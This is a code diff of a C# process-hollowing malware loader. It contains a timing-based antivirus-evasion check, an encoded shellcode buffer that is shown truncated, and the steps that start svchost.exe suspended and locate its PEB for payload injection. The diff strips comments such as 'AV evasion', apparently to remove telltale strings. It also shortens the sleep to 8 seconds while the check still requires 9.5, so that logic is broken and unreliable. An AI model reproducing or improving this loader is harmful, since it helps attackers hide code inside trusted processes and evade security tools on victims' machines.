@@ -95,9 +95,8 @@ namespace ProcessHollowing
         static extern uint ResumeThread(IntPtr hThread);
         public TestClass()
     {
-            // AV evasion: Sleep for 10s and detect if time really passed
             DateTime t1 = DateTime.Now;
-            Sleep(10000);
+            Sleep(8000);
             double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
             if (deltaT < 9.5)
             {
@@ -106,14 +105,12 @@ namespace ProcessHollowing
 
             byte[] buf = new byte[768] { 0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 2, ..... };
 
-            // Start 'svchost.exe' in a suspended state
             StartupInfo sInfo = new StartupInfo();
             ProcessInfo pInfo = new ProcessInfo();
             bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                 false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
             Console.WriteLine($"Started 'svchost.exe' in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");
 
-            // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
             ProcessBasicInfo pbInfo = new ProcessBasicInfo();
             uint retLen = new uint();
             long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
